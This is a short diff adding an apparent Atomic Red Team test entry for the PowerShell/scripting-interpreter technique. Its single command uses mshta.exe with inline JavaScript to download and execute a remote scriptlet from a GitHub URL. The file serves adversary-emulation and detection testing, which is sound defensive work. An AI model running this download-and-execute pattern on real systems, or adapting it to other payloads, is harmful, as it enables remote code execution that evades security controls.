@@ -1,0 +1,7 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Powershell invoke mshta.exe download
+#Language: cmd
+
+#commands
+C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
+
